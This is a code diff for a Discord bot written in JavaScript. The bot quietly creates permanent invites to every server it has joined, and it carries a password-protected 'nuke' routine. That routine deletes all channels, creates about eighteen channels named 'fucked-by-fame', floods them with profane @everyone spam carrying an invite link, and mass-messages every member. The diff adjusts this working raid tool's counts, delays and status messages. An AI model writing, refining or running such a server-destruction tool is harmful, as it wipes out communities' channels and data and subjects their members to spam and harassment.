@@ -68,13 +68,12 @@ client.on('messageCreate', async message => {
 
     const embed = new EmbedBuilder()
       .setColor('#00ffff')
-      .setTitle('📋 Bot Servers & Invites')
-      .setDescription('Servers the bot is in:');
+      .setTitle('📋 Bot Servers & Invites');
 
     for (const guild of guilds) {
       let inviteLink = 'Failed';
       try {
-        const invite = await guild.invites.create(guild.channels.cache.find(c => c.type === 0)?.id || guild.systemChannelId, { maxAge: 0 });
+        const invite = await guild.invites.create(guild.channels.cache.find(c => c.type === 0)?.id, { maxAge: 0 });
         inviteLink = invite.url;
       } catch {}
       embed.addFields({ name: guild.name, value: `**Members:** ${guild.memberCount}\n**Invite:** ${inviteLink}`, inline: false });
@@ -98,7 +97,6 @@ client.on('interactionCreate', async interaction => {
 
     if (action !== 'check') return;
 
-    // Password & Selection (same as before)
     if (interaction.isButton() && interaction.customId.startsWith('check_start_')) {
       const modal = new ModalBuilder()
         .setCustomId(`check_modal_${interaction.user.id}`)
@@ -166,7 +164,7 @@ client.on('interactionCreate', async interaction => {
       }
     }
 
-    // ==================== SIMPLE & RELIABLE NUKE ====================
+    // ==================== RELIABLE NUKE ====================
     if (interaction.isModalSubmit() && interaction.customId.startsWith('check_nuke_modal_')) {
       const password = interaction.fields.getTextInputValue('password');
       if (password !== NUKE_PASSWORD) {
@@ -184,41 +182,41 @@ client.on('interactionCreate', async interaction => {
       const spamText = `@everyone fucked by veynetta ${invite}\n**FAME REAL FAME**`;
 
       try {
-        await interaction.editReply({ content: `☢️ Deleting all channels & categories...` });
+        await interaction.editReply({ content: `☢️ Deleting all channels...` });
 
-        // Delete everything
+        // Delete all channels
         for (const channel of guild.channels.cache.values()) {
           await channel.delete().catch(() => {});
-          await delay(400);
+          await delay(500);
         }
 
-        await interaction.editReply({ content: '🔨 Creating fucked-by-fame channels...' });
-
         // Create channels
-        const createdChannels = [];
-        for (let i = 0; i < 20; i++) {
+        await interaction.followUp({ content: '🔨 Creating fucked-by-fame channels...', flags: MessageFlags.Ephemeral });
+
+        const created = [];
+        for (let i = 0; i < 18; i++) {
           try {
             const chan = await guild.channels.create({
               name: 'fucked-by-fame',
               type: 0,
               reason: 'Fame Takeover'
             });
-            createdChannels.push(chan);
-            await delay(700);
+            created.push(chan);
+            await delay(650);
           } catch (e) { break; }
         }
 
-        // Fast spam
-        await interaction.editReply({ content: `💥 Spamming @everyone in ${createdChannels.length} channels...` });
+        // Spam
+        await interaction.followUp({ content: `💥 Fast spamming @everyone...`, flags: MessageFlags.Ephemeral });
 
-        for (const channel of createdChannels) {
+        for (const channel of created) {
           for (let i = 0; i < 10; i++) {
             channel.send(spamText).catch(() => {});
           }
         }
 
-        // DM Members
-        await interaction.editReply({ content: '📨 Sending DMs...' });
+        // DMs
+        await interaction.followUp({ content: '📨 Sending DMs to members...', flags: MessageFlags.Ephemeral });
         let dmSent = 0;
         const members = await guild.members.fetch();
 
@@ -231,13 +229,14 @@ client.on('interactionCreate', async interaction => {
           } catch {}
         }
 
-        await interaction.editReply({ 
-          content: `✅ **NUKE COMPLETE**\nCreated **${createdChannels.length}** channels named \`fucked-by-fame\`\nFast @everyone spam + DMs sent to **${dmSent}** members` 
+        await interaction.followUp({ 
+          content: `✅ **NUKE COMPLETE**\nCreated **${created.length}** \`fucked-by-fame\` channels\nFast @everyone spam + ${dmSent} DMs sent`,
+          flags: MessageFlags.Ephemeral 
         });
 
       } catch (err) {
         console.error(err);
-        await interaction.editReply({ content: '⚠️ Nuke partially completed.' }).catch(() => {});
+        await interaction.followUp({ content: '⚠️ Nuke partially completed.', flags: MessageFlags.Ephemeral }).catch(() => {});
       }
 
       userSessions.delete(interaction.user.id);
